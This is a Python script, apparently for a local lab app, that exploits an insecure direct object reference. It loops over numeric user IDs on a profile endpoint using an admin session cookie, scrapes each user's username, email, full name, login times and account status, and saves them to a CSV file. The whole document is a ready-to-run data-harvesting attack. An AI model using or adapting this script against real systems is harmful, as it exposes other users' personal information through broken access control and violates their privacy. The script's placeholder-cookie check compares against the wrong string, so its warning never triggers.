import csv
import time
import random
import requests 
import re
from requests.exceptions import RequestException
from bs4 import BeautifulSoup


BASE_URL = "http://localhost:5000/account/profile/" 

SESSION_COOKIE_VALUE = "CHANGE-THIS-WITH-ADMIN-COOKIE" 

OUTPUT_FILE = 'mined_user_data.csv'
FIELDNAMES = ['User ID', 'Username', 'Email', 'Full Name', 'Member Since', 'Last Login', 'Account Status']

START_ID = 1
MAX_ID_TO_TEST = 20
SLEEP_TIME = 0.2

def parse_html_for_data(html_content, user_id):
    soup = BeautifulSoup(html_content, 'html.parser')

    data = {"User ID": user_id}

    profile_card = soup.find('div', class_='card')
    if not profile_card:
        return None

    label_map = {
        "Username:": "Username",
        "Email:": "Email",
        "Full Name:": "Full Name",
        "Member Since:": "Member Since",
        "Last Login:": "Last Login",
        "Account Status:": "Account Status",
    }

    for label_text, data_key in label_map.items():
        label_element = profile_card.find('div', string=label_text)
        if label_element:
            value_element = label_element.find_next_sibling('div')
            if value_element:
                data[data_key] = value_element.text.strip()

    return data


def fetch_user_data(user_id):
    target_url = f"{BASE_URL}{user_id}"

    cookies = {
        "session": SESSION_COOKIE_VALUE,
        "fldt": "hide"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Custom IDOR Scraper)"
    }

    time.sleep(SLEEP_TIME)

    try:
        response = requests.get(target_url, headers=headers, cookies=cookies, timeout=10)
        return response.status_code, response.text if response.status_code == 200 else None
    except RequestException as e:
        return 500, None


print(f"Starting IDOR enumeration attempt against User IDs {START_ID} to {MAX_ID_TO_TEST}...")
print(f"Targeting profile URL: {BASE_URL}{{id}}. Requests are authenticated via cookie.")

if "INSERT SESSION COOKIE PLACEHOLDER" in SESSION_COOKIE_VALUE:
    print("\n!! CRITICAL WARNING: Session cookie placeholder detected. The script will likely fail. !!\n")


with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as csvfile:
    writer = csv.DictWriter(csvfile, fieldnames=FIELDNAMES)
    writer.writeheader()

    for user_id in range(START_ID, MAX_ID_TO_TEST + 1):
        status_code, response_content = fetch_user_data(user_id)

        if status_code == 200 and response_content:
            mined_data = parse_html_for_data(response_content, user_id)

            if mined_data is None:
                print(f"Could not parse profile for ID {user_id}.")
                continue

            writer.writerow(mined_data)
            print(f"Success (ID: {user_id})")
        else:
            print(f"Failed (ID: {user_id}) Status: {status_code}")


print(f"\n--- IDOR Enumeration Complete! ---")
print(f"Data stored in {OUTPUT_FILE}")